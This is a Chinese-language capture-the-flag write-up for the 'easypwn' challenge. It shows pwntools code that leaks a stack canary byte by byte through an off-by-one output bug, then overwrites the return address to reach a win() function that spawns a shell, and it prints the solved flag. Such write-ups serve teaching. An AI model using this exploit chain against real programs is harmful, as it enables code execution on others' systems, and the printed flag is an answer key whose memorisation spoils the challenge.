# easypwn

## 题目简述

程序关闭 PIE 并保留固定地址的 `win()`，但编译器插入了栈 canary。`sorcery` 向 100 字节缓冲区最多读取 `0x100` 字节，随后又错误地输出 `chars_read + 1` 字节；可利用这个多输出的一字节逐轮恢复 canary，再进行 ret2win。

## 解题过程

反汇编确认从缓冲区开头到 canary 的距离为 104 字节。第一次只发送 104 个已知字节，`read` 返回 104，而 `write` 输出 105 字节，于是额外泄露 canary 的第一个字节。下一轮发送 104 字节加已知 canary 前缀，便能继续泄露后一字节：

```python
canary = b""
for _ in range(8):
    io.sendlineafter(b"Choice: ", b"1")
    io.send(b"A" * 104 + canary)
    response = io.recvline()
    canary += response[-2:-1]
```

八轮后得到完整 canary。目标无 PIE，`win()` 地址固定；在 `win` 前增加一个单独的 `ret`，使调用 `system` 时栈保持 16 字节对齐：

```python
from pwn import p64

payload = (
    b"A" * 104
    + canary
    + p64(0)          # saved RBP
    + p64(0x4013a3)   # ret，修正栈对齐
    + p64(exe.sym["win"])
)

io.sendlineafter(b"Choice: ", b"1")
io.send(payload)
```

`win()` 执行 `system("/bin/sh")`。该泄露与 ret2win 链已在随附服务二进制上逐字节跑通，读取到 `grey{b4bY_sT3p5_1n_pwn}`。

## 方法总结

canary 并非必须一次性泄露；只要输出长度比攻击者控制的输入多一字节，并且程序允许重复调用，就能逐步扩展已知前缀。恢复 canary 后仍要保留原值并处理 amd64 ABI 的栈对齐。最终 flag 为 `grey{b4bY_sT3p5_1n_pwn}`。
